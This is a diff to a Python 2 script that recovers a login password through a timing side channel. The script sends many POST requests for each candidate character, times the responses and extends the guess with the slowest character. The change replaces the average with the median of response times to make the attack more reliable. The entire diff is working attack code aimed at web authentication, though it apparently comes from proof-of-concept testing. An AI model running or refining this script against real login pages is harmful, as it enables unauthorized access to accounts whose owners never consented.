@@ -12,6 +12,7 @@ import requests
 import string
 import sys
 import argparse
+from statistics import median
 
 def makerequest(guess):
     '''
@@ -24,7 +25,7 @@ def makerequest(guess):
         (based on the highest time value in the dict of characters)
     '''
     chartimes = {}
-    chartimeavg = {}
+    chartimemedian = {}
     global FAILEDPOCS
     global KNOWNPASSWORD
 
@@ -33,8 +34,8 @@ def makerequest(guess):
     for c in CHARSET:
         newguess = guess + c
 
-        # initialize the time for the character to be 0
-        chartimes[c] = 0.0
+        # initialize the list of response times for the character
+        chartimes[c] = []
 
         print "Sending " + str(NUMREQUESTS) + " requests to the server for the password '" + newguess + "'"
         parameters = {USERNAMEPOSTPARAM: USERNAME, PASSWORDPOSTPARAM: newguess}
@@ -50,21 +51,28 @@ def makerequest(guess):
                 print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
                 sys.exit()
             #print "response is: " + r.text
-            chartimes[c] += end - start
+            #chartimes[c] += end - start
+            chartimes[c].append(end - start)
             if i == NUMREQUESTS-1:
-                print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(chartimes[c]) + " seconds."
+                totaltime = 0
+                for i in chartimes[c]:
+                    totaltime += i
+                #print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(chartimes[c]) + " seconds."
+                print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(totaltime) + " seconds."
 
     # get avg of chartimes
-    chartimeavg = getaverage(chartimes)
+    #chartimemedian = getaverage(chartimes)
+    chartimemedian = getmedian(chartimes)
 
     # create a counter for the following for loop
     n = 0
 
     # sort the characters based on the average time
-    print "Average time per request for each password guess"
-    for key, value in sorted(chartimeavg.iteritems(), key=lambda (k,v): (v,k)):
+    #print "Average time per request for each password guess"
+    print "Median time per request for each password guess"
+    for key, value in sorted(chartimemedian.iteritems(), key=lambda (k,v): (v,k)):
         print "%s: %s" % (key, value)
-        if n == len(chartimeavg.keys())-1:
+        if n == len(chartimemedian.keys())-1:
             newguess = guess + key
             print "Guessing password begins with: '" + newguess + "'"
             # if performing a PoC test
@@ -77,25 +85,32 @@ def makerequest(guess):
             return newguess
         n += 1
 
+def getmedian(chartimes):
 
+    chartimemedian = {}
 
-def getaverage(chartimes):
-    '''
-        Takes the passed parameter (chartimes) as a dict. The key:value pairs 
-        are character: total_time where total_time is the total amount of time 
-        it took the server to respond to all of the requests for that character
-        collectively.
-
-        Return: the dict in a key:value pair where the value is the average 
-        amount of time for all of the requests 
-    '''
-    chartimeavg = {}
-
-    # get average time for each request for every character
     for char in chartimes:
-        chartimeavg[char] = chartimes[char]/NUMREQUESTS
+        chartimemedian[char] = median(chartimes[char])
 
-    return chartimeavg
+    return chartimemedian
+
+#def getaverage(chartimes):
+#    '''
+#        Takes the passed parameter (chartimes) as a dict. The key:value pairs 
+#        are character: total_time where total_time is the total amount of time 
+#        it took the server to respond to all of the requests for that character
+#        collectively.
+#
+#        Return: the dict in a key:value pair where the value is the average 
+#        amount of time for all of the requests 
+#    '''
+#    chartimeavg = {}
+#
+#    # get average time for each request for every character
+#    for char in chartimes:
+#        chartimeavg[char] = chartimes[char]/NUMREQUESTS
+#
+#    return chartimeavg
 
 
 def main():
